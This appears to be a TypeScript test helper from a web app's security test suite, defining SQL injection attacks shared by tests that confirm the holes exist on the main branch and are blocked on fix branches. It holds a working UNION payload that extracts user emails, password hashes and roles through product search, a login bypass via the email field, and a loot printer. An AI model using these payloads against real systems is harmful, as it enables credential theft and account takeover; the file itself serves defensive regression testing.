import { api } from "../helpers.js";

// Reusable attacks — authored ONCE, imported by both the exploit tests
// (assert the attack succeeds on `main`) and the fixed tests (assert it is
// blocked on fix/*). No exploit logic is ever rewritten between the two.

export const SEARCH_UNION_PAYLOAD = `' UNION SELECT id, email, "passwordHash", role::text FROM "User"-- `;

export interface LeakedCred {
  email: string;
  password: string;
  role: string;
}

// #1 SQLi (UNION): try to exfiltrate User credentials through product search.
export async function exfiltrateUsersViaSearch(): Promise<{ status: number; loot: LeakedCred[] }> {
  const res = await api("GET", `/api/search?q=${encodeURIComponent(SEARCH_UNION_PAYLOAD)}`);
  const results = ((res.json as { results?: Record<string, string>[] })?.results ?? []).filter(
    (r) => typeof r?.name === "string" && r.name.includes("@"),
  );
  // In the UNION: User.email → name, passwordHash → description, role → category.
  const loot = results.map((r) => ({ email: r.name, password: r.description, role: r.category }));
  return { status: res.status, loot };
}

// #2 SQLi (auth bypass): comment out the password check via the email field.
export async function loginBypass(injectedEmail: string): Promise<{ status: number; user?: { email: string; role: string } }> {
  const res = await api("POST", "/api/auth/login", {
    body: { email: injectedEmail, password: "not-the-password" },
  });
  return { status: res.status, user: (res.json as { user?: { email: string; role: string } })?.user };
}

// Pretty-print stolen creds so the test output is a screenshottable artifact.
export function printLoot(title: string, loot: LeakedCred[]): void {
  const lines = loot.map((c) => `    ${c.email.padEnd(24)} : ${c.password.padEnd(14)} [${c.role}]`);
  // eslint-disable-next-line no-console
  console.log(`\n  🩸 ${title}\n${lines.join("\n")}\n`);
}
